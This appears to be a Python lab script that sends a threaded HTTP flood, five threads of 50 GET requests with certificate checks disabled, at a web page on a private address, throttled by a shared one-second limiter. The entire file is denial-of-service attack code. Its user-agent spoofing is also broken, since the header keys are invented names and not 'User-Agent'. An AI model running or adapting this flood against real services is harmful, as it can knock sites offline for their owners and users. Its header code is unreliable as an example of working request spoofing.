import requests
import threading
import subprocess
from datetime import datetime, timedelta
import time

# Global variables to track rate limiting
last_request_time = datetime.min
lock = threading.Lock()


def show_logs():
    try:
        log_display = subprocess.check_output(['tail', '-n', '10', '/var/log/apache2/access.log'])
        log_display = log_display.decode('utf-8')
        print(log_display)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")


def rate_limiting():
    global last_request_time, lock

    print("Executing rate limiting (1 second between allowed requests)...")

    # Acquire lock to ensure thread safety
    with lock:
        current_time = datetime.now()
        time_since_last_request = current_time - last_request_time

        # Checks if the rate limit has been reached
        if time_since_last_request < timedelta(seconds=1):
            # Sleep to enforce rate limiting
            time.sleep((timedelta(seconds=1) - time_since_last_request).total_seconds())

        # Update last request time
        last_request_time = datetime.now()


def http_flood(target_url, num_of_requests):
    user_agents = {
        "User-Agent-1": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
        "User-Agent-2": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
        "User-Agent-3": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
        "User-Agent-4": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
        "User-Agent-5": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
        "User-Agent-6": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
        "User-Agent-7": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
        "User-Agent-8": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
        "User-Agent-9": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
        "User-Agent-10": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
    }

    # Flood the webpage with requests
    for _ in range(num_of_requests):
        try:
            # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
            send_request = requests.get(target_url, headers=user_agents, verify=False)
            print(f"Request status: {send_request.status_code}")
            print()

            # Call the rate limiting function
            rate_limiting()
        except Exception as e:
            print(f"Error: {str(e)}")


if __name__ == "__main__":
    target_url = "http://10.0.2.15/real-estate-html-template/index.html"
    num_of_requests = 50

    print(f"Starting HTTP flood, targeting {target_url}")

    # Creates and sends multiple threads synchronously
    threads = []
    for _ in range(5):
        thread = threading.Thread(target=http_flood, args=(target_url, num_of_requests))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    print(f"HTTP flood finished.")
